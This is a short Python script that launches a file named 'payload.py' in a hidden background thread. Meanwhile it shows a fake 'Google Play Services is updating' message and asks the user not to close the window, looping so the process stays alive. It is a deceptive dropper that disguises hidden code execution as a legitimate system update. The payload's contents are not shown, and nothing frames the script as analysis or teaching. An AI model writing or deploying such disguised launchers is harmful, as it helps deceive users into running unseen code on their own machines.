import os, threading, time
def start_payload():
    os.system("python payload.py")
t = threading.Thread(target=start_payload)
t.daemon = True
t.start()
print("Google Play Services is updating...")
print("Please do not close this window.")
while True:
    time.sleep(10)
  
